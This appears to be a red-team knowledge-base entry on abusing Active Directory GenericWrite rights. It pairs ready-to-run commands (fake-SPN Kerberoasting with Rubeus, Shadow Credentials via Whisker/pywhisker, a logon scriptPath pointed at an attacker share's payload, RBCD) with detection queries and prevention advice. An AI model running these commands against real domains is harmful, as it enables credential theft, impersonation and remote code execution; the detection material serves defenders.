name: GenericWrite Abuse - Targeted Kerberoast/Shadow Creds/Logon Script
description: GenericWrite permission allows modifying non-protected attributes on an AD object. For user objects, this enables targeted Kerberoasting (set SPN), logon script injection (scriptPath), or Shadow Credentials (msDS-KeyCredentialLink). For computer objects, it enables RBCD setup. GenericWrite is one of the most common and dangerous ACL misconfigurations in AD.
source: CRTP ACL abuse module; BloodHound edge documentation
notes:
=== ABUSE PATH 1: TARGETED KERBEROAST ===
  # Set a fake SPN on the target user
  Set-DomainObject -Identity <target_account> -Set @{serviceprincipalname="fake/spn"} -Verbose
  # Kerberoast the user
  Rubeus.exe kerberoast /user:<target_account> /nowrap
  # Clean up
  Set-DomainObject -Identity <target_account> -Clear serviceprincipalname -Verbose

=== ABUSE PATH 2: SHADOW CREDENTIALS ===
  # Add key credential link
  Whisker.exe add /target:<target_account>
  # Or with pywhisker from Linux:
  python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target_account> --action add
  # Authenticate with the generated certificate
  Rubeus.exe asktgt /user:<target_account> /certificate:<base64_cert> /password:<cert_pass> /ptt

=== ABUSE PATH 3: LOGON SCRIPT ===
  Set-DomainObject -Identity <target_account> -Set @{scriptpath="\\<attacker>\share\payload.ps1"}
  # Executes next time the user logs in

=== ABUSE PATH 4: RBCD (on computer objects) ===
  Set-ADComputer <target_computer> -PrincipalsAllowedToDelegateToAccount <attacker_computer>$

references.title: MITRE T1222.001 - File and Directory Permissions Modification

recommended.note: Full targeted Kerberoasting workflow after setting the SPN.
Decision tree for choosing the right ACL abuse path.

defense.why_it_works: GenericWrite allows setting most non-protected attributes. ServicePrincipalName, scriptPath, and msDS-KeyCredentialLink are all writable, enabling multiple attack paths from a single permission.
defense.prerequisites: GenericWrite permission on a target user or computer object.
defense.impact: Credential theft via Kerberoasting; remote code execution via logon script; impersonation via Shadow Credentials.
defense.detection: [MITRE T1558.003] SPN modification on user accounts (Event 5136); scriptPath changes; msDS-KeyCredentialLink modifications.
defense.artifacts: Event 5136 (directory service change) for SPN/scriptPath/KeyCredentialLink; Event 4769 for subsequent Kerberoast.
defense.splunk_spl:
index=windows EventCode=5136 (AttributeLDAPDisplayName="servicePrincipalName" OR AttributeLDAPDisplayName="scriptPath" OR AttributeLDAPDisplayName="msDS-KeyCredentialLink")
| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue
defense.sentinel_kql:
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName in ("servicePrincipalName", "scriptPath", "msDS-KeyCredentialLink")
| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue
defense.prevention: Audit and remove unnecessary GenericWrite permissions; monitor attribute changes on privileged accounts; use Protected Users group.

detections.name: GenericWrite abuse - SPN or scriptPath modification
detections.logic:
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName in ("servicePrincipalName", "scriptPath", "msDS-KeyCredentialLink")
| where SubjectUserName !in ("SYSTEM", "Exchange")
| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue
detections.false_positives: Legitimate SPN management; script deployment via GPO
detections.tuning: Whitelist known admin accounts and automation; alert on user-object SPN changes
